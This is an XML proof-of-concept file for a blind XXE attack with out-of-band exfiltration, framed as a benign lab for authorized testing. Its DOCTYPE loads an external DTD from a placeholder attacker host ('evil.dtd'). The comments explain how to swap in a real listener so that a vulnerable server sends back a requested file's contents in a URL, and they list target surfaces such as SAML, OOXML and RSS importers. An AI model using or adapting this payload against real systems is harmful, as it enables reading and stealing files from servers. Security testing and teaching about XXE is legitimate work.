<!--
  Safe PoC -> x8bitranjit.
  Benign PoC lab - x8bitranjit style. Authorized security testing only.

  WHAT THIS DEMONSTRATES: Blind XXE - OOB callback via parameter entity +
  external DTD. Use when the XML is parsed but nothing is reflected.

  WHERE IT FIRES: XML/XML-backed endpoints and OOXML imports (docx/xlsx
  internal XML), SAML metadata, RSS/OPML importers.

  WHAT TO EDIT (2 places):
    1) Below: YOUR-OOB-HOST.example.invalid  -> your listener
    2) xxe_oob_beacon.dtd: same replacement
  ".invalid" never resolves -> inert as shipped. When edited and parsed by a
  vulnerable server, the server fetches the DTD from you, then beacons back
  with the requested file's content in the URL (the classic two-hop exfil).

  The REAL exfil DTD body (authorized only) is included in the .dtd comments.
-->
<!DOCTYPE poc [
  <!ENTITY % dtd SYSTEM "http://xxe1.YOUR-OOB-HOST.example.invalid/evil.dtd">
  %dtd;
  %send;
]>
<poc>
  <title>Benign blind-XXE OOB PoC</title>
  <trigger>&exfil;</trigger>
</poc>
